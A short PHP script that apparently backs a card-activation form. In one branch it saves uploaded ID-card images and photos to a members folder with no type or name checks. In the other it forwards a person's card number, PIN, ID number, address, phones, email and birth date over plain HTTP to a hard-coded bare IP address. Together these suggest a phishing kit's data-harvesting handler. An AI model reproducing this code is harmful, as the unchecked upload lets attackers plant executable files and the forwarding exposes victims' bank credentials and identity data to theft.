<?php

function reArrayFiles(&$file_post) {
    $file_ary = array();
    $file_count = count($file_post['name']);
    $file_keys = array_keys($file_post);
    for ($i=0; $i<$file_count; $i++) {
        foreach ($file_keys as $key) {
            $file_ary[$i][$key] = $file_post[$key][$i];
        }
    }
    return $file_ary;
}

if($_REQUEST['loadFileConf'] == 1){
$uploaddir = '../membersImages/';
$uploadfile = $uploaddir . basename($_FILES['cedulaIMG']['name']);
move_uploaded_file($_FILES['cedulaIMG']['tmp_name'], $uploadfile);
$ar = reArrayFiles($_FILES['photos']);
foreach ($ar as $key) {
$uploadfile = $uploaddir . basename($key['name']);
move_uploaded_file($key['tmp_name'], $uploadfile);
}
}else{
$url = 'http://192.185.36.179/services/?BC=globalmx_activetarjetastep2&';
$fields = array(
	'cedula'=>$_POST["id_document"],
	'tarjeta'=>$_POST["tarjeta"],
	'ciudad'=>$_POST["id_ciudad"],
	'nombre'=>$_POST["id_first_name"],
	'apellido'=>$_POST["id_first_lastname"],
	'nombre2'=>$_POST["id_last_name"],
	'apellido2'=>$_POST["id_last_lastname"],
	'direccion'=>$_POST["id_direccion"],
	'barrio'=>$_POST["id_barrio"],
	'telefono'=>$_POST["id_telefono"],
	'celular'=>$_POST["id_celular"],
	'email'=>$_POST["id_email"],
	'codigo_postal'=>$_POST["id_codpostal"],
	'fecha_nacimiento'=>$_POST["id_nacimiento"],
	'pin'=>$_POST["pin"]
);
$postvars='';
$sep='';
foreach($fields as $key=>$value)
{
        $postvars.= $sep.urlencode($key).'='.urlencode($value);
        $sep='&';
}
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_POST,count($fields));
curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
$result = curl_exec($ch);
curl_close($ch);
$json = json_decode($result);
if($json->success == 'true'){
echo 1;
}else{
echo "<strong>¡".$json->message[0]->recommend."!  </strong>".$json->message[0]->msg;
}
}
?>